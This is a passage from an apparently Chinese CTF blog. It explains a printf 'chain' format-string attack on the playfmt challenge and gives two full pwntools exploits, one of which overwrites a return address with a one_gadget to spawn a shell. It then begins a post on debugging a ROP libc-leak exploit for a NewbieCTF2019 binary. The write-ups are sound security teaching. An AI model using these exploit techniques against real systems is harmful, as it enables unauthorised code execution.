/lib/i386-linux-gnu/libm<span class="number">-2.27</span>.so</span><br><span class="line"><span class="number">0xf7c56000</span> <span class="number">0xf7c57000</span> r--p     <span class="number">1000</span> ff000  /lib/i386-linux-gnu/libm<span class="number">-2.27</span>.so</span><br><span class="line"><span class="number">0xf7c57000</span> <span class="number">0xf7c58000</span> rw-p     <span class="number">1000</span> <span class="number">100000</span> /lib/i386-linux-gnu/libm<span class="number">-2.27</span>.so</span><br><span class="line"><span class="number">0xf7c58000</span> <span class="number">0xf7e2d000</span> r-xp   <span class="number">1</span>d5000 <span class="number">0</span>      /lib/i386-linux-gnu/libc<span class="number">-2.27</span>.so</span><br><span class="line"><span class="number">0xf7e2d000</span> <span class="number">0xf7e2e000</span> ---p     <span class="number">1000</span> <span class="number">1</span>d5000 /lib/i386-linux-gnu/libc<span class="number">-2.27</span>.so</span><br><span class="line"><span class="number">0xf7e2e000</span> <span class="number">0xf7e30000</span> r--p     <span class="number">2000</span> <span class="number">1</span>d5000 /lib/i386-linux-gnu/libc<span class="number">-2.27</span>.so</span><br><span class="line"><span class="number">0xf7e30000</span> <span class="number">0xf7e31000</span> rw-p     <span class="number">1000</span> <span class="number">1</span>d7000 /lib/i386-linux-gnu/libc<span class="number">-2.27</span>.so</span><br><span class="line"><span class="number">0xf7e31000</span> <span class="number">0xf7e34000</span> rw-p     <span class="number">3000</span> <span class="number">0</span>      </span><br><span class="line"><span class="number">0xf7e34000</span> <span class="number">0xf7fb0000</span> r-xp   <span class="number">17</span>c000 <span class="number">0</span>      /usr/lib32/libstdc++.so<span class="number">.6</span><span class="number">.0</span><span class="number">.25</span></span><br><span class="line"><span class="number">0xf7fb0000</span> <span class="number">0xf7fb6000</span> r--p     <span class="number">6000</span> <span class="number">17b</span>000 /usr/lib32/libstdc++.so<span class="number">.6</span><span class="number">.0</span><span class="number">.25</span></span><br><span class="line"><span class="number">0xf7fb6000</span> <span class="number">0xf7fb7000</span> rw-p     <span class="number">1000</span> <span class="number">181000</span> /usr/lib32/libstdc++.so<span class="number">.6</span><span class="number">.0</span><span class="number">.25</span></span><br><span class="line"><span class="number">0xf7fb7000</span> <span class="number">0xf7fba000</span> rw-p     <span class="number">3000</span> <span class="number">0</span>      </span><br><span class="line"><span class="number">0xf7fd0000</span> <span class="number">0xf7fd2000</span> rw-p     <span class="number">2000</span> <span class="number">0</span>      </span><br><span class="line"><span class="number">0xf7fd2000</span> <span class="number">0xf7fd5000</span> r--p     <span class="number">3000</span> <span class="number">0</span>      [vvar]</span><br><span class="line"><span class="number">0xf7fd5000</span> <span class="number">0xf7fd6000</span> r-xp     <span class="number">1000</span> <span class="number">0</span>      [vdso]</span><br><span class="line"><span class="number">0xf7fd6000</span> <span class="number">0xf7ffc000</span> r-xp    <span class="number">26000</span> <span class="number">0</span>      /lib/i386-linux-gnu/ld<span class="number">-2.27</span>.so</span><br><span class="line"><span class="number">0xf7ffc000</span> <span class="number">0xf7ffd000</span> r--p     <span class="number">1000</span> <span class="number">25000</span>  /lib/i386-linux-gnu/ld<span class="number">-2.27</span>.so</span><br><span class="line"><span class="number">0xf7ffd000</span> <span class="number">0xf7ffe000</span> rw-p     <span class="number">1000</span> <span class="number">26000</span>  /lib/i386-linux-gnu/ld<span class="number">-2.27</span>.so</span><br><span class="line"><span class="number">0xfff00000</span> <span class="number">0xffffe000</span> rw-p    fe000 <span class="number">0</span>      [<span class="built_in">stack</span>]</span><br></pre></td></tr></table></figure>

<p>首先需要得到当前栈的地址和<code>libc</code>的基地址，这些地址可以很轻松的在栈上找到</p>
<p>不难发现栈上有libc地址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0xf7e30000 0xf7e31000 rw-p     1000 1d7000 /lib/i386-linux-gnu/libc-2.27.so</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">08:0020│      0xffffd050 —▸ 0xf7e30000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1d7d6c</span><br></pre></td></tr></table></figure>

<p>可知<code>esp+0x18</code>存放了栈地址，<code>esp+0x20</code>存放了<code>libc</code>的地址，根据32位栈溢出的公式可以得知</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">esp+0x18 : 0x18 / 4 = 8</span><br><span class="line">esp+0x20 : 0x20 / 4 = 8</span><br></pre></td></tr></table></figure>

<p>可以得到分别是第6个参数和第8个参数，直接传入<code>%6$p%8$p</code>即可得到栈地址和<code>libc</code>地址</p>
<p><strong>printf</strong>成链攻击的缺点就是需要很多次<strong>printf</strong>，但是如果你有任意地址读写权限后，相信做到这一点也并非难事 </p>
<p>这里主要需要解决的就是如何将要改写的地址放在栈上。实现任意地址写需要依赖栈上存在一个链式结构</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0xffffd048-&gt;0xffffd068-&gt;0xffffd098</span><br></pre></td></tr></table></figure>

<p>这三个地址都在栈上，我们就可以利用<code>printf</code>的<code>%n</code>对不同链层的数据进行修改，从而使得这条数据链可以指向任意地址 </p>
<p>下图是一个简单的栈地址空间图，<code>offset</code>表示格式化的参数位置。通过第<code>offset0</code>个参数，利用<code>%hhn</code>可以控制<code>address1</code>的最低位，再通过第<code>offset1</code>个参数，利用<code>%hhn</code>可以写<code>address2</code>的最低位；然后通过<code>offset0</code>参数，利用<code>%hhn</code>修改<code>address1</code>的最低位为<code>原始值+1</code>，再通过<code>offset1</code>参数，利用<code>%hhn</code>可以写<code>address2</code>的次低位；依次循环即可完全控制<code>address2</code>的值，再次利用<code>address1和address2</code>的链式结构，即可实现对<code>address2</code>地址空间的任意写。对应到上面显示的地址空间</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">address0=0xffffd048,offset0=0x18/4=6;</span><br><span class="line">address1=0xffffd068,offset1=0x38/4=14;</span><br><span class="line">address2=0xffffd098,offset2=0x68/4=26;</span><br></pre></td></tr></table></figure>

<p> <img src="https://p1.ssl.qhimg.com/t01027399ee82efa5dd.png" alt="img"> </p>
<p>这里我用上面的数据链简单举个例，我们可以利用<code>0xffffd068—▸ 0xffffd098◂— 0x0</code>来修改<code>0xffffd098</code>地址的数据，但是<code>printf</code>的<code>%n</code>最大只能修改到<code>0x2000</code>，也就是说我们一般只能修改<code>一个byte</code>，原本这并没有什么用，但是别忘了，这是一条完整的数据链，我们可以利用<code>ebp  0xffffd048—▸ 0xffffd068—▸ 0xffffd098</code>修改<code>0xffffd068</code>的低地址数据（<code>0xffffd098</code>）的低地址，简单来说就是修改为<code>0xffffd099</code>，然后 <code>0xffffd068 —▸ 0xffffd098◂— 0x0</code>就会变成<code>0xffffd068 —▸ 0xffffd099◂— 0x0</code>，接下来我们就可以利用这条链修改<code>0xffffd099</code>地址的值，也就是<code>第二个byte</code>，依次类推，我们就能在栈上写任意地址，然后在用栈上的地址进行任意读写。就这样往往复复，造成了这个恶性循环。 </p>
<p>简单来说就是一条栈数据链，前面的链功能是修改我们要任意读写的地址，后面的链的功能则是对前面修改出来的地址进行任意读写。 </p>
<p>下面是地址写代码的实现，首先获取<code>address1</code>的最低位的原始值，然后依次写<code>address2</code>的各个字节</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">def write_address(off0,off1,target_addr):</span><br><span class="line">    io.sendline(&quot;%&#123;&#125;$p&quot;.format(off1))</span><br><span class="line">    io.recvuntil(&quot;0x&quot;)</span><br><span class="line">    addr1 = int(io.recv(8),16)&amp;0xff</span><br><span class="line">    io.recv()</span><br><span class="line">    for i in range(4):</span><br><span class="line">        io.sendline(&quot;%&#123;&#125;c%&#123;&#125;$hhn&quot;.format(addr1+i,off0))</span><br><span class="line">        io.recv()</span><br><span class="line">        io.sendline(&quot;%&#123;&#125;c%&#123;&#125;$hhn&quot;.format(target_addr&amp;0xff,off1))</span><br><span class="line">        io.recv()        </span><br><span class="line">        target_addr=target_addr&gt;&gt;8</span><br><span class="line">    io.sendline(&quot;%&#123;&#125;c%&#123;&#125;$hhn&quot;.format(addr1,off0))</span><br><span class="line">    io.recv()</span><br></pre></td></tr></table></figure>

<p>这里需要介绍一下<strong>one_gadget</strong></p>
<p><strong>one-gadget</strong> 是glibc里调用<code>execve(&#39;/bin/sh&#39;, NULL, NULL)</code>的一段非常有用的<strong>gadge</strong>t。在我们能够控制<strong>ip</strong>（也就是<strong>pc</strong>）的时候，用<strong>one-gadge</strong>t来做<strong>RCE</strong>（远程代码执行）非常方便，比如有时候我们能够做一个任意函数执行，但是做不到控制第一个参数，这样就没办法调用<code>system(&quot;sh&quot;)</code>，这个时候<strong>one gadget</strong>就可以搞定 </p>
<p>再次运行<code>write_address</code>将<code>0xfff566cc</code>写上<code>one_gadget</code>地址</p>
<p>最后输入<code>quit</code>退出循环，执行<code>return result</code>时就能获取shell</p>
<p>由于我没拿到题目的<strong>libc</strong>，也没法真正的去做题所以大概就是先了解一下，借用一下别人的EXP</p>
<p>官方EXP，里面有很多很方便值得学习的格式化字符串函数可以学习一下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level = "debug"</span></span><br><span class="line">do_fmt_ebp_offset = <span class="number">6</span></span><br><span class="line">play_ebp_offset = <span class="number">14</span></span><br><span class="line">main_ebp_offset = <span class="number">26</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">format_offset</span><span class="params">(format_str , offset)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> format_str.replace(<span class="string">"&#123;&#125;"</span> , str(offset))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_target_offset_value</span><span class="params">(offset , name)</span>:</span></span><br><span class="line">    payload = format_offset(<span class="string">"%&#123;&#125;$p\x00"</span> , offset)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    text = p.recv()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        value = int(text.split(<span class="string">"\n"</span>)[<span class="number">0</span>] , <span class="number">16</span>)</span><br><span class="line">          print(name + <span class="string">" : "</span> + hex(value))</span><br><span class="line">        <span class="keyword">return</span> value</span><br><span class="line">    <span class="keyword">except</span> Exception, e:</span><br><span class="line">        <span class="keyword">print</span> text</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modify_last_byte</span><span class="params">(last_byte , offset)</span>:</span></span><br><span class="line">    payload = <span class="string">"%"</span> + str(last_byte) + <span class="string">"c"</span> + format_offset(<span class="string">"%&#123;&#125;$hhn"</span> , offset)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    p.recv()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modify</span><span class="params">(addr , value , ebp_offset , ebp_1_offset)</span>:</span></span><br><span class="line">    addr_last_byte = addr &amp; <span class="number">0xff</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">        now_value = (value &gt;&gt; i * <span class="number">8</span>) &amp; <span class="number">0xff</span></span><br><span class="line">        modify_last_byte(addr_last_byte + i ,  ebp_offset)</span><br><span class="line">        modify_last_byte(now_value , ebp_1_offset)</span><br><span class="line">p = process(<span class="string">"./playfmt"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./playfmt"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"=\n"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"=\n"</span>)</span><br><span class="line"><span class="comment"># leak ebp_1_addr then get ebp_addr</span></span><br><span class="line">play_ebp_addr = get_target_offset_value(do_fmt_ebp_offset,  <span class="string">"logo_ebp"</span>) </span><br><span class="line"><span class="comment"># get_ebp_addr</span></span><br><span class="line">main_ebp_addr = get_target_offset_value(do_fmt_ebp_offset,  <span class="string">"main_ebp"</span>)</span><br><span class="line"><span class="comment"># flag_class_ptr_addr = main_ebp_addr + 0x10</span></span><br><span class="line"><span class="comment"># flag_class_ptr_offset = main_ebp_offset - 4</span></span><br><span class="line">flag_class_ptr_offset = <span class="number">19</span></span><br><span class="line">flag_addr = get_target_offset_value(flag_class_ptr_offset , <span class="string">"flag_addr"</span>) - <span class="number">0x420</span></span><br><span class="line">log.info(hex(flag_addr))</span><br><span class="line"><span class="comment"># puts_plt = elf.plt["puts"]</span></span><br><span class="line">modify(main_ebp_addr + <span class="number">4</span> , flag_addr , do_fmt_ebp_offset , play_ebp_offset)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">payload = format_offset(<span class="string">"%&#123;&#125;$s\x00"</span> , play_ebp_offset + <span class="number">1</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="comment"># log.info("flag_addr : " + hex(flag_addr))</span></span><br><span class="line"><span class="comment"># p.sendline("quit")</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>另一种EXP</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io = remote('120.78.192.35', 9999)</span></span><br><span class="line">io = process(<span class="string">"./playfmt"</span>)</span><br><span class="line">elf = ELF(<span class="string">'./playfmt'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib32/libc-2.23.so'</span>)</span><br><span class="line"><span class="comment">#context.log_level = 'DEBUG'</span></span><br><span class="line"><span class="comment">#gdb.attach(io,"b *0x0804889f")</span></span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(<span class="string">"%6$p%8$p"</span>)</span><br><span class="line">io.recvuntil(<span class="string">"0x"</span>)</span><br><span class="line">stack_addr = int(io.recv(<span class="number">8</span>),<span class="number">16</span>)<span class="number">-0xffffd648</span>+<span class="number">0xffffd610</span></span><br><span class="line">io.recvuntil(<span class="string">"0x"</span>)</span><br><span class="line">libc.address = int(io.recv(<span class="number">8</span>),<span class="number">16</span>)<span class="number">-0xf7e41000</span>+<span class="number">0xf7c91000</span></span><br><span class="line">log.success(<span class="string">"stack_addr:"</span>+hex(stack_addr))</span><br><span class="line">log.success(<span class="string">"libc_addr:"</span>+hex(libc.address))</span><br><span class="line">io.recv()</span><br><span class="line">offset0=<span class="number">0x18</span>/<span class="number">4</span></span><br><span class="line">offset1=<span class="number">0x38</span>/<span class="number">4</span></span><br><span class="line">offset2=<span class="number">0x68</span>/<span class="number">4</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_address</span><span class="params">(off0,off1,target_addr)</span>:</span></span><br><span class="line">    io.sendline(<span class="string">"%&#123;&#125;$p"</span>.format(off1))</span><br><span class="line">    io.recvuntil(<span class="string">"0x"</span>)</span><br><span class="line">    addr1 = int(io.recv(<span class="number">8</span>),<span class="number">16</span>)&amp;<span class="number">0xff</span></span><br><span class="line">    io.recv()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">        io.sendline(<span class="string">"%&#123;&#125;c%&#123;&#125;$hhn"</span>.format(addr1+i,off0))</span><br><span class="line">        io.recv()</span><br><span class="line">        io.sendline(<span class="string">"%&#123;&#125;c%&#123;&#125;$hhn"</span>.format(target_addr&amp;<span class="number">0xff</span>,off1))</span><br><span class="line">        io.recv()        </span><br><span class="line">        target_addr=target_addr&gt;&gt;<span class="number">8</span></span><br><span class="line">    io.sendline(<span class="string">"%&#123;&#125;c%&#123;&#125;$hhn"</span>.format(addr1,off0))</span><br><span class="line">    io.recv()</span><br><span class="line"></span><br><span class="line">one_gadget = libc.address+ <span class="number">0x5f065</span></span><br><span class="line">print(hex(one_gadget))</span><br><span class="line">write_address(offset0,offset1,stack_addr+<span class="number">0x1c</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io,"b *0x0804889f")</span></span><br><span class="line">write_address(offset1,offset2,one_gadget)</span><br><span class="line">io.sendline(<span class="string">"quit"</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<blockquote>
<p>注意：这里我特别强调一点，在单次<code>printf</code>操作中，是没有办法完成printf成链攻击的，因为单次<code>printf</code>时，一旦你对已经修改过的地址的值进行修改时，则要不就直接<code>crash</code>，要不就根本没反应，所以一定要多次<code>printf</code>才能完成该攻击方式。这是我自己尝试过的，然后单次就能完成printf成链攻击，那么这将是一个非常致命的漏洞 </p>
</blockquote>
<p>接下来简单说一下利用方式，<code>printf</code>成链攻击的实施一般至少需要两次<code>printf</code>才行（除非你运气好到爆棚，恰好有一个地址指向了函数的返回地址），第一次我们可以使<code>栈数据链</code>指向某个函数的返回地址，一般为了简单我们可以直接指向第二次<code>printf</code>的返回地址，由于栈布局是固定的，我们确实可以预测其返回地址。然后第二次printf操作时，便可以劫持其返回地址，然后重新返回<code>main</code>或者指向一个可以让<code>printf</code>复用的地址，然后我们就可以重复使用<code>printf</code>实现任意地址读写，这样就完成了一次<code>printf</code>成链攻击。 </p>
<blockquote>
<p>参考文章</p>
<p>【1】非栈上格式化字符串漏洞利用技巧 ：<a href="https://www.anquanke.com/post/id/184717" target="_blank" rel="noopener">https://www.anquanke.com/post/id/184717</a></p>
<p>【2】printf 成链攻击 ：<a href="http://blog.eonew.cn/archives/1196" target="_blank" rel="noopener">http://blog.eonew.cn/archives/1196</a></p>
</blockquote>

        
      
    </div>

    
    
    
      <footer class="post-footer">
          <div class="post-eof"></div>
        
      </footer>
  </div>
  
  
  
  </article>

    
       <article itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block home">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/06/EXP║═╡≈╩╘╡─╨í┐╙-1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="ZERO-A-ONE">
      <meta itemprop="description" content="Resit much,Obey little">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZERO-A-ONE">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
            
            <a href="/2019/11/06/EXP║═╡≈╩╘╡─╨í┐╙-1/" class="post-title-link" itemprop="url">EXP和调试的小坑-1</a>
          
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              
                
              

              <time title="Created: 2019-11-06 18:44:44" itemprop="dateCreated datePublished" datetime="2019-11-06T18:44:44-08:00">2019-11-06</time>
            </span>
          
            

            
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2019-11-07 10:45:24" itemprop="dateModified" datetime="2019-11-07T10:45:24-08:00">2019-11-07</time>
              </span>
            
          

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>以NewbieCTF2019的<strong>dRop_the_beat</strong>为例子，记录了一下撰写EXP和调试的一些小坑和技巧</p>
<p>首先检测这个程序</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">syc@ubuntu:~/Desktop/share/NewbieCTF/Pwnable/dRop_the_beat$ checksec drop_the_beat_easy</span><br><span class="line">[*] &apos;/mnt/hgfs/share/NewbieCTF/Pwnable/dRop_the_beat/drop_the_beat_easy&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>

<p>就只是开启了栈不可执行的保护，然后用IDA Pro打开查看一下源代码</p>
<figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp+0h] [ebp-68h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+4h] [ebp-64h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"      dP  888888ba   .88888.   888888ba       dP   dP                   dP                           dP   "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"      88  88    `8b d8'   `8b  88    `8b      88   88                   88                           88   "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">".d888b88 a88aaaa8P' 88     88 a88aaaa8P'    d8888P 88d888b. .d8888b.    88d888b. .d8888b. .d8888b. d8888P "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"88'  `88  88   `8b. 88     88  88             88   88'  `88 88ooood8    88'  `88 88ooood8 88'  `88   88   "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"88.  .88  88     88 Y8.   .8P  88             88   88    88 88.  ...    88.  .88 88.  ... 88.  .88   88   "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"`88888P8  dP     dP  `8888P'   dP             dP   dP    dP `88888P'    88Y8888' `88888P' `88888P8   dP   "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"oooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;byte_80489F3);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"dROP The beat(easy version)"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;byte_80489F3);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"1) Give Him a Beat!"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"2) No Beat For You..!"</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v4);</span><br><span class="line">  <span class="keyword">if</span> ( v4 != <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">":( Sorry, You Can't be with us..."</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Give Me a Beat!!"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x12C</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;buf);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Wow... That's AWESOME!"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>很简单的栈溢出然后ROP的题目，大概思路就是暴露libc版本和地址即可，然后我写了一个错误的EXP</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">"./drop_the_beat_easy"</span>,env=&#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"./libc.so.6"</span>&#125;)</span><br><span class="line">elf = ELF(<span class="string">'./drop_the_beat_easy'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,"b*0x08048672")</span></span><br><span class="line">libc_start_main_got = elf.got[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">main = elf.symbols[<span class="string">'main'</span>]</span><br><span class="line">payload = <span class="string">"A"</span>*<span class="number">104</span>+p32(puts_plt)+p32(libc_start_main_got)+p32(main)</span><br><span class="line">p.recvuntil(<span class="string">'2) No Beat For You..!\n'</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Give Me a Beat!!\n'</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">"Wow... That's AWESOME!\n"</span>)</span><br><span class="line"><span class="comment">#info(p.recv())</span></span><br><span class="line">libc.address = u32(p.recv(<span class="number">4</span>)) - libc.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">info(<span class="string">"libc : "</span> + hex(libc.address))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>我的payload写错了，应该是<strong>main</strong>作为函数的返回地址，<strong>libc</strong>作为第一个参数</p>
<figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">"A"</span>*<span class="number">104</span>+p32(puts_plt)+p32(main)+p32(libc_start_main_got)</span><br></pre></td></tr></table></figure>

<p>这里想说的是如何检查自己的payload是否书写正确，就是最后的返回地址<strong>EIP</strong>是否劫持成功，这里有一个下断点的小技巧，我们一般下在溢出函数后的一个<code>leave</code>指令处</p>
<p>例如这题的汇编代码</p>
